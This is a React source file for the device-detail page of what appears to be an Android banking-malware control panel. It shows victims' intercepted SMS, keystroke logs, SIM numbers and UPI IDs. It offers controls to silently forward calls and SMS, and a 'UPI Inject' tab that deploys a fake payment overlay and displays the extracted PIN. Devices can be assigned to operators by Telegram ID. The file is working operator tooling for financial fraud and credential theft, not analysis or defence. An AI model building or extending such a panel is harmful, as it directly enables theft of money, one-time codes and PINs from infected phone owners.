import { useState, useEffect, useRef } from 'react';
import { useRoute, Link, useLocation } from 'wouter';
import { db } from '@/lib/firebase';
import { ref, onValue, set, remove, push, update } from 'firebase/database';
import { Layout } from '@/components/layout';
import { useAuth } from '@/lib/auth';
import { 
  ArrowLeft, Smartphone, Battery, Copy, Trash2, Shield, 
  MessageSquare, Terminal, PhoneForwarded, IndianRupee, AlertTriangle,
  Pin, PinOff, UserCheck, Search, ChevronRight, RefreshCw
} from 'lucide-react';
import { format } from 'date-fns';

interface DeviceData {
  phone?: string;
  upi?: string;
  model?: string;
  battery?: string;
  status?: string;
  ping?: string;
  sim1?: string;
  sim2?: string;
  sms?: Record<string, any>;
  keylog?: Record<string, any>;
  callForward?: {
    type?: string;
    number?: string;
    active?: boolean;
  };
  inject?: {
    upiPin?: string;
    status?: string;
    speed?: string;
    active?: boolean;
  };
}

const TABS = [
  { id: 'sms', label: 'Messages', icon: MessageSquare },
  { id: 'keylog', label: 'KeyLog', icon: Terminal },
  { id: 'forward', label: 'Call Fwd', icon: PhoneForwarded },
  { id: 'inject', label: 'UPI Inject', icon: IndianRupee },
  { id: 'delete', label: 'Destruct', icon: Trash2 },
];

export function DeviceDetail() {
  const [, params] = useRoute('/device/:id');
  const [, setLocation] = useLocation();
  const id = params?.id;
  const { isAdmin, userId } = useAuth();
  
  const [device, setDevice] = useState<DeviceData | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('sms');
  const [statusInput, setStatusInput] = useState('');
  
  const [isPinned, setIsPinned] = useState(false);
  const [ownerInput, setOwnerInput] = useState('');
  const [savingOwner, setSavingOwner] = useState(false);

  const [smsSearch, setSmsSearch] = useState('');
  const [forwardType, setForwardType] = useState('call');
  const [forwardNumber, setForwardNumber] = useState('');
  
  useEffect(() => {
    if (!id) return;
    
    const deviceRef = ref(db, `clients/${id}`);
    const unsubscribe = onValue(deviceRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        setDevice(data);
        if (!device) {
          setStatusInput(data.status || '');
          setOwnerInput(data.ownerTelegramId || '');
          if (data.callForward) {
            setForwardType(data.callForward.type || 'call');
            setForwardNumber(data.callForward.number || '');
          }
        }
      } else {
        setDevice(null);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  }, [id]);

  useEffect(() => {
    if (!id || !userId) return;
    const pinRef = ref(db, `config/pins/${userId}/${id}`);
    const unsubscribe = onValue(pinRef, (snapshot) => {
      setIsPinned(snapshot.exists() && snapshot.val() === true);
    });
    return () => unsubscribe();
  }, [id, userId]);

  const togglePin = () => {
    if (!id || !userId) return;
    const pinRef = ref(db, `config/pins/${userId}/${id}`);
    if (isPinned) {
      remove(pinRef);
    } else {
      set(pinRef, true);
    }
  };

  const handleSaveOwner = async () => {
    if (!id) return;
    setSavingOwner(true);
    await update(ref(db, `clients/${id}`), {
      ownerTelegramId: ownerInput.trim() || null,
    });
    setSavingOwner(false);
  };

  const handleUpdateStatus = () => {
    if (!id) return;
    update(ref(db, `clients/${id}`), {
      status: statusInput
    });
  };

  const handleDeleteDevice = () => {
    if (!id) return;
    if (confirm('Are you sure you want to destruct this node? All data will be wiped.')) {
      remove(ref(db, `clients/${id}`));
      setLocation('/dashboard');
    }
  };

  const handleClearKeylog = () => {
    if (!id) return;
    if (confirm('Clear all keylog data?')) {
      remove(ref(db, `clients/${id}/keylog`));
    }
  };

  const handleDeleteSms = (pushKey: string) => {
    if (!id) return;
    remove(ref(db, `clients/${id}/sms/${pushKey}`));
  };

  const handleToggleForwarding = (activate: boolean) => {
    if (!id) return;
    set(ref(db, `clients/${id}/callForward`), {
      type: forwardType,
      number: forwardNumber,
      active: activate
    });
  };

  const handleStartInjection = () => {
    if (!id) return;
    update(ref(db, `clients/${id}/inject`), {
      active: true,
      status: 'pending'
    });
  };

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (loading) {
    return (
      <Layout>
        <div className="animate-pulse space-y-6">
          <div className="h-12 bg-[#ecdbfd] rounded-3xl w-1/3"></div>
          <div className="h-32 bg-[#ecdbfd] rounded-3xl w-full"></div>
          <div className="h-96 bg-[#ecdbfd] rounded-3xl w-full"></div>
        </div>
      </Layout>
    );
  }

  if (!device) {
    return (
      <Layout>
        <div className="flex flex-col items-center justify-center py-24 bg-[#ecdbfd] rounded-3xl border border-[#d8c8f0]">
          <AlertTriangle className="w-12 h-12 text-[#f59e0b] mb-4" />
          <h2 className="text-xl font-bold text-[#2d1b4e]">Node Disconnected or Destroyed</h2>
          <p className="text-[#6b5b7d] mt-2">The device data no longer exists.</p>
          <Link href="/dashboard" className="mt-6 bg-[#7c3aed] text-white px-6 py-2.5 rounded-full font-semibold hover:bg-[#6d28d9] transition-colors">
            Return to Dashboard
          </Link>
        </div>
      </Layout>
    );
  }

  const isOnline = device.ping ? (Date.now() - parseInt(device.ping, 10)) < 300000 : false;
  const smsList = device.sms ? Object.entries(device.sms).reverse() : [];
  const filteredSms = smsSearch 
    ? smsList.filter(([_, sms]: any) => (sms.body || '').toLowerCase().includes(smsSearch.toLowerCase()) || (sms.from || '').includes(smsSearch))
    : smsList;
    
  const keylogList = device.keylog ? Object.entries(device.keylog).reverse() : [];

  const onlineDot = (
    <span className={`relative inline-flex rounded-full h-2.5 w-2.5 ${isOnline ? 'bg-[#10b981]' : 'bg-[#9ca3af]'}`}>
      {isOnline && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#10b981] opacity-75" />}
    </span>
  );

  return (
    <Layout>
      <div className="mb-6 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-4">
          <Link href="/dashboard" className="p-2.5 bg-[#ecdbfd] border border-[#d8c8f0] rounded-2xl hover:bg-[#f5efff] transition-colors">
            <ArrowLeft className="w-5 h-5 text-[#6b5b7d]" />
          </Link>
          <div>
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold text-[#2d1b4e]">{device.model || 'Unknown Device'}</h1>
              <span className={`px-3 py-1 rounded-full text-xs font-semibold flex items-center gap-1.5 ${isOnline ? 'bg-[#10b981]/10 text-[#10b981]' : 'bg-[#9ca3af]/20 text-[#6b5b7d]'}`}>
                {onlineDot}
                {isOnline ? 'Online' : 'Offline'}
              </span>
            </div>
            <p className="text-[#6b5b7d] text-sm mt-0.5">Device ID: {id}</p>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Left Sidebar - Device Info */}
        <div className="lg:col-span-1 space-y-6">
          <div className="bg-[#ecdbfd] border border-[#d8c8f0] rounded-3xl overflow-hidden relative">
            <div className="h-1 w-full bg-[#7c3aed]" />
            <div className="p-4 space-y-4">
              <div className="flex justify-between items-center pb-3 border-b border-[#d8c8f0]">
                <span className="text-sm font-medium text-[#6b5b7d]">Overview</span>
                <button
                  onClick={() => copyText(`${device.model || 'Unknown'} | ${device.phone || 'N/A'} | ${id}`)}
                  className="p-1.5 rounded-full hover:bg-[#f5efff] text-[#6b5b7d] transition-colors"
                >
                  <Copy className="w-3.5 h-3.5" />
                </button>
              </div>

              <div className="grid grid-cols-2 gap-3 text-sm">
                <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                  <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">Model</span>
                  <span className="text-[#2d1b4e] font-medium text-xs truncate block">{device.model || '—'}</span>
                </div>
                <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                  <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">Phone</span>
                  <span className="text-[#2d1b4e] font-medium text-xs truncate block">{device.phone || '—'}</span>
                </div>
                <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3 col-span-2">
                  <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">UPI ID</span>
                  <span className="text-[#7c3aed] font-medium text-xs truncate block">{device.upi || '—'}</span>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3 text-sm">
                <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                  <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">SIM 1</span>
                  <div className="flex items-center gap-1">
                    <span className="text-[#2d1b4e] text-xs truncate">{device.sim1 || 'N/A'}</span>
                    {device.sim1 && <Copy className="w-3 h-3 text-[#6b5b7d] cursor-pointer hover:text-[#7c3aed]" onClick={() => copyText(device.sim1!)} />}
                  </div>
                </div>
                <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                  <span className="text-[10px] font-bold text-[#6b5b7d] uppercase tracking-wider block">SIM 2</span>
                  <div className="flex items-center gap-1">
                    <span className="text-[#2d1b4e] text-xs truncate">{device.sim2 || 'N/A'}</span>
                    {device.sim2 && <Copy className="w-3 h-3 text-[#6b5b7d] cursor-pointer hover:text-[#7c3aed]" onClick={() => copyText(device.sim2!)} />}
                  </div>
                </div>
              </div>

              <div className="flex justify-between items-center pb-3 border-b border-[#d8c8f0]">
                <span className="text-sm font-medium text-[#6b5b7d]">Battery</span>
                <span className={`font-semibold text-sm flex items-center gap-1.5 ${
                  getBatteryValue(device.battery) <= 20 ? 'text-[#f59e0b]' : 'text-[#2d1b4e]'
                }`}>
                  <Battery className="w-4 h-4" />
                  {device.battery || 'N/A'}
                </span>
              </div>

              <div className="flex items-center justify-between pb-3 border-b border-[#d8c8f0]">
                <span className="text-sm font-medium text-[#6b5b7d]">Pinned</span>
                <button
                  onClick={togglePin}
                  className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
                    isPinned
                      ? 'bg-[#7c3aed]/10 text-[#7c3aed] border border-[#7c3aed]/30'
                      : 'bg-[#f5efff] border border-[#d8c8f0] text-[#6b5b7d] hover:text-[#2d1b4e]'
                  }`}
                >
                  {isPinned ? <PinOff className="w-3.5 h-3.5" /> : <Pin className="w-3.5 h-3.5" />}
                  {isPinned ? 'Unpin' : 'Pin to Top'}
                </button>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-[#6b5b7d] block">Operator Memo</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={statusInput}
                    onChange={(e) => setStatusInput(e.target.value)}
                    placeholder="Enter status..."
                    className="flex-1 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all"
                  />
                  <button 
                    onClick={handleUpdateStatus}
                    className="bg-[#7c3aed] hover:bg-[#6d28d9] text-white px-4 py-2 rounded-full text-xs font-semibold transition-colors"
                  >
                    Set
                  </button>
                </div>
              </div>

              {isAdmin && (
                <div className="space-y-2 pt-2 border-t border-[#d8c8f0]">
                  <label className="text-sm font-medium text-[#6b5b7d] flex items-center gap-1.5">
                    <UserCheck className="w-3.5 h-3.5" /> Assign Owner
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={ownerInput}
                      onChange={(e) => setOwnerInput(e.target.value)}
                      placeholder="Telegram ID..."
                      className="flex-1 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all min-w-0"
                    />
                    <button
                      onClick={handleSaveOwner}
                      disabled={savingOwner}
                      className="bg-[#7c3aed] hover:bg-[#6d28d9] text-white px-4 py-2 rounded-full text-xs font-semibold transition-colors disabled:opacity-50 whitespace-nowrap"
                    >
                      {savingOwner ? '...' : 'Save'}
                    </button>
                  </div>
                  <p className="text-[10px] text-[#6b5b7d]">
                    Set karne se woh user hi is device ko dekh sakta hai
                  </p>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Right Content - Tabs */}
        <div className="lg:col-span-3">
          <div className="bg-[#ecdbfd] border border-[#d8c8f0] rounded-3xl overflow-hidden flex flex-col h-[700px]">
            <div className="flex overflow-x-auto border-b border-[#d8c8f0] hide-scrollbar bg-[#f5efff] p-2 gap-2">
              {TABS.map(tab => {
                const Icon = tab.icon;
                const isActive = activeTab === tab.id;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={`flex items-center gap-2 px-4 py-2 text-sm font-semibold rounded-full transition-colors whitespace-nowrap
                      ${isActive 
                        ? tab.id === 'delete' ? 'bg-[#ef4444] text-white shadow-md shadow-red-200' : 'bg-[#7c3aed] text-white shadow-md shadow-purple-200'
                        : 'text-[#6b5b7d] hover:bg-white hover:text-[#2d1b4e]'
                      }`}
                  >
                    <Icon className="w-4 h-4" />
                    {tab.label}
                  </button>
                );
              })}
            </div>

            <div className="flex-1 overflow-y-auto p-4 bg-[#faf7ff] relative">
              {/* Tab 1: SMS */}
              {activeTab === 'sms' && (
                <div className="h-full flex flex-col space-y-4">
                  <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                    <h3 className="font-semibold text-[#2d1b4e]">Messages</h3>
                    <div className="relative w-full sm:w-64">
                      <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#6b5b7d]" />
                      <input
                        type="text"
                        placeholder="Search messages..."
                        value={smsSearch}
                        onChange={(e) => setSmsSearch(e.target.value)}
                        className="w-full bg-white border border-[#d8c8f0] rounded-2xl py-2 pl-10 pr-4 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all"
                      />
                    </div>
                  </div>
                  
                  {filteredSms.length === 0 ? (
                    <div className="flex-1 flex items-center justify-center text-[#6b5b7d] text-sm border border-dashed border-[#d8c8f0] rounded-3xl bg-[#f5efff]">
                      No messages found.
                    </div>
                  ) : (
                    <div className="flex-1 overflow-y-auto space-y-3 pr-2">
                      {filteredSms.map(([key, sms]: any) => (
                        <div key={key} className="bg-white border border-[#d8c8f0] rounded-2xl p-4 group relative hover:border-[#b8a0e0] transition-colors shadow-sm">
                          <div className="flex justify-between items-start mb-2">
                            <div className="font-semibold text-sm bg-[#ecdbfd] text-[#7c3aed] px-3 py-1 rounded-full">
                              {sms.from || 'Unknown'}
                            </div>
                            <div className="text-xs text-[#6b5b7d]">
                              {sms.date ? format(new Date(parseInt(sms.date)), 'MMM d, HH:mm:ss') : 'Unknown Time'}
                            </div>
                          </div>
                          <div className="text-sm leading-relaxed break-words text-[#2d1b4e] pl-1 border-l-2 border-[#d8c8f0]">
                            {sms.body || ''}
                          </div>
                          
                          <div className="absolute top-3 right-3 opacity-0 group-hover:opacity-100 flex gap-1 transition-opacity">
                            <button 
                              onClick={() => copyText(sms.body || '')}
                              className="p-1.5 bg-[#f5efff] hover:bg-[#ecdbfd] text-[#6b5b7d] hover:text-[#7c3aed] rounded-xl border border-[#d8c8f0] transition-colors"
                              title="Copy"
                            >
                              <Copy className="w-3.5 h-3.5" />
                            </button>
                            <button 
                              onClick={() => handleDeleteSms(key)}
                              className="p-1.5 bg-[#f5efff] hover:bg-red-50 text-[#6b5b7d] hover:text-[#ef4444] rounded-xl border border-[#d8c8f0] transition-colors"
                              title="Delete"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {/* Tab 2: KeyLog */}
              {activeTab === 'keylog' && (
                <div className="h-full flex flex-col space-y-4">
                  <div className="flex justify-between items-center">
                    <h3 className="font-semibold text-[#2d1b4e]">Keystroke Log</h3>
                    <button 
                      onClick={handleClearKeylog}
                      disabled={keylogList.length === 0}
                      className="text-xs font-semibold bg-red-50 text-[#ef4444] border border-[#ef4444]/20 hover:bg-red-100 px-4 py-2 rounded-full transition-colors disabled:opacity-50"
                    >
                      Clear Log
                    </button>
                  </div>
                  
                  <div className="flex-1 bg-white border border-[#d8c8f0] rounded-2xl overflow-y-auto p-4 font-mono text-sm whitespace-pre-wrap leading-relaxed text-[#2d1b4e]">
                    {keylogList.length === 0 ? (
                      <span className="text-[#6b5b7d]">No keystrokes recorded yet...</span>
                    ) : (
                      keylogList.map(([key, log]: any) => (
                        <div key={key} className="mb-2 hover:bg-[#f5efff] p-2 rounded-xl transition-colors break-all">
                          <span className="text-[#7c3aed] select-none mr-2">›</span>
                          <span>{log.text || ''}</span>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              )}

              {/* Tab 3: Call Forward */}
              {activeTab === 'forward' && (
                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-[#ecdbfd] rounded-full flex items-center justify-center mx-auto mb-3 border border-[#d8c8f0]">
                      <PhoneForwarded className="w-8 h-8 text-[#7c3aed]" />
                    </div>
                    <h2 className="text-lg font-bold text-[#2d1b4e]">Call Forwarding</h2>
                    <p className="text-sm text-[#6b5b7d]">Redirect incoming calls or SMS silently.</p>
                  </div>
                  
                  <div className="bg-white border border-[#d8c8f0] p-6 rounded-3xl space-y-5 shadow-sm">
                    <div className="space-y-3">
                      <label className="text-xs font-bold uppercase text-[#6b5b7d] tracking-wider">Intercept Type</label>
                      <div className="flex gap-2 bg-[#f5efff] p-1 rounded-full border border-[#d8c8f0]">
                        <button
                          onClick={() => setForwardType('call')}
                          className={`flex-1 py-2 text-sm font-semibold rounded-full transition-colors ${forwardType === 'call' ? 'bg-[#7c3aed] text-white' : 'text-[#6b5b7d] hover:text-[#2d1b4e]'}`}
                        >
                          Call
                        </button>
                        <button
                          onClick={() => setForwardType('sms')}
                          className={`flex-1 py-2 text-sm font-semibold rounded-full transition-colors ${forwardType === 'sms' ? 'bg-[#7c3aed] text-white' : 'text-[#6b5b7d] hover:text-[#2d1b4e]'}`}
                        >
                          SMS
                        </button>
                      </div>
                    </div>
                    
                    <div className="space-y-3">
                      <label className="text-xs font-bold uppercase text-[#6b5b7d] tracking-wider">Destination Number</label>
                      <input
                        type="text"
                        value={forwardNumber}
                        onChange={(e) => setForwardNumber(e.target.value)}
                        placeholder="+91..."
                        className="w-full bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-4 py-2.5 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all"
                      />
                    </div>
                    
                    <div className="pt-2 flex gap-3">
                      {device.callForward?.active ? (
                        <button 
                          onClick={() => handleToggleForwarding(false)}
                          className="flex-1 bg-[#f59e0b] hover:bg-[#d97706] text-white font-bold py-2.5 rounded-full transition-colors shadow-md shadow-orange-200"
                        >
                          Deactivate
                        </button>
                      ) : (
                        <button 
                          onClick={() => handleToggleForwarding(true)}
                          className="flex-1 bg-[#7c3aed] hover:bg-[#6d28d9] text-white font-bold py-2.5 rounded-full transition-colors shadow-md shadow-purple-200"
                        >
                          Activate
                        </button>
                      )}
                    </div>
                  </div>
                  
                  {device.callForward?.active && (
                    <div className="bg-[#ecdbfd] border border-[#d8c8f0] rounded-2xl p-3 text-center text-sm font-semibold text-[#7c3aed] flex items-center justify-center gap-2">
                      {onlineDot}
                      Forwarding active to {device.callForward.number}
                    </div>
                  )}
                </div>
              )}

              {/* Tab 4: UPI Inject */}
              {activeTab === 'inject' && (
                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-[#ecdbfd] rounded-full flex items-center justify-center mx-auto mb-3 border border-[#d8c8f0]">
                      <IndianRupee className="w-8 h-8 text-[#7c3aed]" />
                    </div>
                    <h2 className="text-lg font-bold text-[#2d1b4e]">UPI Overlay</h2>
                    <p className="text-sm text-[#6b5b7d]">Deploy fake payment overlay and extract PIN.</p>
                  </div>
                  
                  <div className="bg-white border border-[#d8c8f0] p-5 rounded-3xl shadow-sm">
                    <div className="space-y-4 text-sm">
                      <div className="flex justify-between items-center py-2 border-b border-[#d8c8f0]">
                        <span className="text-[#6b5b7d]">Target Device:</span>
                        <span className="text-[#2d1b4e] font-medium">{device.model || 'Unknown'}</span>
                      </div>
                      <div className="flex justify-between items-center py-2 border-b border-[#d8c8f0]">
                        <span className="text-[#6b5b7d]">Status:</span>
                        <span className={`font-bold ${
                          device.inject?.status === 'success' ? 'text-[#10b981]' : 
                          device.inject?.status === 'pending' ? 'text-[#f59e0b] animate-pulse' : 
                          'text-[#6b5b7d]'
                        }`}>
                          {device.inject?.status?.toUpperCase() || 'IDLE'}
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-2 border-b border-[#d8c8f0]">
                        <span className="text-[#6b5b7d]">Extraction Speed:</span>
                        <span className="text-[#2d1b4e] font-medium">{device.inject?.speed || '0ms'}</span>
                      </div>
                      
                      <div className="pt-4 flex flex-col gap-2">
                        <span className="text-xs text-[#6b5b7d] uppercase tracking-widest text-center font-bold">Extracted PIN</span>
                        <div className="bg-[#f5efff] border border-[#d8c8f0] border-dashed h-16 rounded-2xl flex items-center justify-center text-2xl font-bold tracking-[0.5em] text-[#7c3aed]">
                          {device.inject?.upiPin || '****'}
                        </div>
                      </div>
                    </div>
                    
                    <button 
                      onClick={handleStartInjection}
                      disabled={device.inject?.active}
                      className="w-full mt-6 bg-[#7c3aed] hover:bg-[#6d28d9] disabled:bg-[#7c3aed]/30 disabled:cursor-not-allowed text-white font-bold py-3 rounded-full transition-colors flex items-center justify-center gap-2 shadow-md shadow-purple-200"
                    >
                      <Shield className="w-4 h-4" />
                      {device.inject?.active ? 'Injection Active' : 'Deploy Overlay'}
                    </button>
                  </div>
                </div>
              )}

              {/* Tab 5: Delete */}
              {activeTab === 'delete' && (
                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-3 border border-[#ef4444]/20">
                      <AlertTriangle className="w-8 h-8 text-[#ef4444]" />
                    </div>
                    <h2 className="text-lg font-bold text-[#ef4444]">Destruct Sequence</h2>
                    <p className="text-sm text-[#6b5b7d] mt-2">
                      This will permanently wipe all logs, messages, and device records from the control server. The payload on the device will not be uninstalled, but the connection will be orphaned.
                    </p>
                  </div>
                  
                  <div className="bg-red-50 border border-[#ef4444]/20 p-6 rounded-3xl text-center">
                    <p className="text-sm mb-6 text-[#ef4444]/80 font-medium">Type the device ID to confirm or just click destruct if you're sure.</p>
                    
                    <button 
                      onClick={handleDeleteDevice}
                      className="w-full bg-[#ef4444] hover:bg-[#dc2626] text-white font-bold py-4 rounded-full transition-all hover:scale-[1.02] shadow-md shadow-red-200 flex items-center justify-center gap-2"
                    >
                      <Trash2 className="w-5 h-5" />
                      Permanently Destruct
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}

function getBatteryValue(battery: string | undefined) {
  if (!battery) return 0;
  return parseInt(battery.replace('%', ''), 10) || 0;
}
